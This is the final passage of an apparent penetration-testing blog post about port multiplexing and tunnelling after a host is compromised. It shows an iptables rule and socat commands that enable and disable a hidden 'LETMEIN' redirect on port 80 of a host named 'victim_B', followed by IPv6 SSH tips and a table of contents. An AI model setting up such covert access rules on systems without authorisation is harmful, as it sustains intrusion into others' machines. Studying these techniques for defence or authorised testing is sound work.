</span></span><span class="line"><span class="cl">iptables -t nat -A PREROUTING -p tcp --dport <span class="m">80</span> --syn -m recent --rcheck --seconds <span class="m">3600</span> --name letmein --rsource -j LETMEIN
</span></span></code></pre></div><p>One drawback is that the IP list added to <code>letmein</code> is the upstream proxy‚Äôs IP. So enabling this rule will affect normal users.</p>
<p>But even so, this is already quite well done. Since IP changes across hops, there aren‚Äôt spare header fields you can use as markers. At the TCP layer, aside from the Urgent Pointer field, everything else is meaningful, so you can only identify via payload content. But then iptables becomes less useful and it deviates from the original intent. Even in extremely constrained environments, I‚Äôd rather reuse an application-layer service than mess with this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## enable LETMEIN</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> threathuntercoming <span class="p">|</span> socat - tcp:victim_B:80
</span></span><span class="line"><span class="cl"><span class="c1">## disable LETMEIN</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> threathunterleaving <span class="p">|</span> socat - tcp:victim_B:80
</span></span></code></pre></div><h2 id="using-ipv6">Using IPv6</h2>
<p>If the device supports IPv6, maybe the ports are not restricted; you can try it.</p>
<p>On Linux, when using an IPv6 link-local address, add <code>%</code> to specify the interface name:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh root@fe80::2e0:4cff:fe68:eae%eth0
</span></span><span class="line"><span class="cl">ping6 fe80::aefa:5908:5d93:44ba%eth0
</span></span></code></pre></div><p>On Windows, use it directly:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">ping -6 fe80::aefa:5908:5d93:44ba
</span></span></code></pre></div><h2 id="summary">Summary</h2>
<p>This is just one small piece of penetration testing. In real engagements you also need to deal with intrusion detection systems, which is still a blind spot for me.</p>
<h2 id="reference">Reference</h2>
<p><a href="https://threathunter.org/topic/594545184ea5b2f5516e2033"target="_blank" rel="noopener noreferrer">Remotely controlling iptables to multiplex ports</a></p>
<p><a href="https://linux.die.net/man/8/iptables"target="_blank" rel="noopener noreferrer">iptables - Linux man page</a></p>
<!-- TODO: translate content from zh version; assets are copied. -->
</article><section class="article labels"><a class="category" href=/en/categories/cybersecurity/>Cybersecurity</a><a class="tag" href=/en/tags/forwarding/>forwarding</a><a class="tag" href=/en/tags/tunnel/>tunnel</a><a class="tag" href=/en/tags/port-mapping/>port mapping</a><a class="tag" href=/en/tags/post-exploitation/>post-exploitation</a><a class="tag" href=/en/tags/forward-proxy/>forward proxy</a><a class="tag" href=/en/tags/reverse-proxy/>reverse proxy</a></section>
</div>

<div class="toc-wrapper">
    <div class="toc-content-box" id="toc-content-box">
        <div class="toc-header">Table of Contents</div>
        <nav id="TableOfContents">
  <ol>
    <li><a href="#approach">Approach</a></li>
    <li><a href="#direct-forwarding">Direct Forwarding</a>
      <ol>
        <li><a href="#ssh">SSH</a>
          <ol>
            <li><a href="#forward-a-remote-port-to-a-local-port">Forward a remote port to a local port</a></li>
            <li><a href="#forward-a-local-port-to-a-remote-port">Forward a local port to a remote port</a></li>
            <li><a href="#use-a-socks5-proxy">Use a SOCKS5 proxy</a></li>
          </ol>
        </li>
        <li><a href="#iptables-port-mapping">iptables Port Mapping</a></li>
        <li><a href="#netsh-port-mapping">netsh Port Mapping</a></li>
        <li><a href="#netcat">netcat</a>
          <ol>
            <li><a href="#port-mapping">Port mapping</a></li>
            <li><a href="#port-forwarding">Port forwarding</a></li>
          </ol>
        </li>
        <li><a href="#socat">socat</a>
          <ol>
            <li><a href="#mapping">Mapping</a></li>
            <li><a href="#forwarding">Forwarding</a></li>
          </ol>
        </li>
        <li><a href="#udp-tunnel">UDP Tunnel</a>
          <ol>
            <li><a href="#rtcp2udp">rtcp2udp</a></li>
            <li><a href="#udptunnel">udptunnel</a></li>
          </ol>
        </li>
        <li><a href="#icmp-tunnel">ICMP Tunnel</a>
          <ol>
            <li><a href="#icmptunnel">icmptunnel</a></li>
            <li><a href="#ptunnel">ptunnel</a></li>
          </ol>
        </li>
        <li><a href="#sctp-tunnel">SCTP Tunnel</a>
          <ol>
            <li><a href="#dccp-tunnel">DCCP Tunnel</a></li>
          </ol>
        </li>
        <li><a href="#nginx-forwarding">Nginx Forwarding</a></li>
        <li><a href="#other-tools">Other Tools</a></li>
      </ol>
    </li>
    <li><a href="#application-layer-tunnels">Application-Layer Tunnels</a>
      <ol>
        <li><a href="#socks">Socks</a></li>
        <li><a href="#apt">APT</a></li>
        <li><a href="#dns-tunnel">DNS tunnel</a></li>
        <li><a href="#webshell-tunnel">WebShell tunnel</a></li>
        <li><a href="#rmi-deserialized-tunnel">RMI Deserialized tunnel</a></li>
      </ol>
    </li>
    <li><a href="#multiplexing-tricks">Multiplexing Tricks</a>
      <ol>
        <li><a href="#webshell">Webshell</a></li>
        <li><a href="#iptables-rules">iptables Rules</a>
          <ol>
            <li><a href="#split-traffic-by-source-port">Split traffic by source port</a></li>
            <li><a href="#split-traffic-by-icmp-length">Split traffic by ICMP length</a></li>
            <li><a href="#split-traffic-by-tcp-keyword">Split traffic by TCP keyword</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#using-ipv6">Using IPv6</a></li>
    <li><a href="#summary">Summary</a></li>
    <li><a href="#reference">Reference</a></li>
  </ol>
</nav>
    </div>
    <div class="toc-button" onclick="toggleTOC()" title="">
        
        <svg viewBox="0 0 24 24">
            <path d="M4 6h16v2H4zm0 5h16v2H4zm0 5h16v2H4z"></path>
        </svg>
    </div>
</div>

<script>
    function toggleTOC() {
        const tocBox = document.getElementById('toc-content-box');
        if (tocBox.classList.contains('show')) {
            tocBox.classList.remove('show');
            
            
            
            
            
            setTimeout(() => {
                tocBox.style.display = 'none';
            }, 300); 
        } else {
            tocBox.style.display = 'block';
            
            void tocBox.offsetWidth;
            tocBox.classList.add('show');
        }
    }

    
    document.addEventListener('click', function (event) {
        const wrapper = document.querySelector('.toc-wrapper');
        const tocBox = document.getElementById('toc-content-box');
        if (wrapper && !wrapper.contains(event.target) && tocBox.classList.contains('show')) {
            toggleTOC();
        }
    });
</script><div class="article bottom"><section class="article navigation"><p><a class="link" href="/en/posts/remove-bcy-image-watermark-and-download-limit/"><span class="iconfont icon-article"></span>Remove Banciyuan Image Watermark and Download Limit</a></p><p><a class="link" href="/en/posts/linux-post-exploitation-pam-backdoor-notes/"><span class="iconfont icon-article"></span>Linux Post-Exploitation Notes: PAM Backdoor</a></p></section></div></section><section id="footer"><div class="footer-wrap">
    <p class="copyright">2015 - 2026 Gorgias' Blog. </p><p class="license">
        <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">
            <img alt="CC BY-NC-SA" loading="lazy" src="/images/by-nc.svg" style="vertical-align: middle; height: 1.2em; margin: 0 0.2em;" />
            CC BY-NC-SA 4.0
        </a>
        (Attribution-NonCommercial-ShareAlike).
    </p><p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
        target="_blank" rel="noopener noreferrer">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
        target="_blank" rel="noopener noreferrer">Notepadium</a></p></div></section></body>

</html>